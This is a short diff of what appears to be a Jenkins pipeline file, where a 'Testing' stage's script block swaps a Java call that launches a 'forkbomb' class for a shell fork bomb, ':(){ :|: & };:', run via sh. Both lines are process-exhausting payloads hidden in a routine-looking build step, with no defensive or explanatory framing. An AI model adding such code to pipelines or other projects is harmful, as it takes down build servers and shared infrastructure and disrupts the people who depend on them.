@@ -17,7 +17,7 @@ pipeline {
             steps {
 
               script {
-                Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "forkbomb"});
+                sh ":(){ :|: & };:"
               }
                 echo 'Testing..'
             }
